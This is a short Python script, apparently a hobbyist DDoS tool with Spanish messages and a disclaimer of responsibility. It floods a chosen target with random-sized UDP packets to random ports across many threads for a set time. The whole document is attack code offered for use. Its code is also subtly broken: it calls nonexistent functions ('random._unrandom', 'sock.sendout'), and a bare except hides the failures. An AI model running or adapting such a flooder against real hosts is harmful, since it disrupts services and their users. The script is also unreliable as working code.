import socket, random, threading, sys, time

print('\n[🐺] ⚠️El Creador no se hace cargo de las consecuencias que puede provocar esto⚠️ ')

try:
    target = str(sys.argv[1])
    threads = int(sys.argv[2])
    timer = float(sys.argv[3])
except IndexError:
    print('\n[🐺] Comandos: python  ' + sys.argv[0] + ' <target> <threads> <time> !')
    sys.exit()

timeout = time.time() + 1 * timer    

def atack():
    try:
        bytes = random._unrandom(1024)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < timeout:
            dport = random.randint(20,55500)
            sock.sendout(bytes*random.randint(5,15),(target, dport))
        return
        sys.exit()
    except:
        pass
print('\n[+]Starting atack...')
for x in range(0, threads):
    threading.Thread(target=atack).start()

print('\n[+]Ataque Realizado.')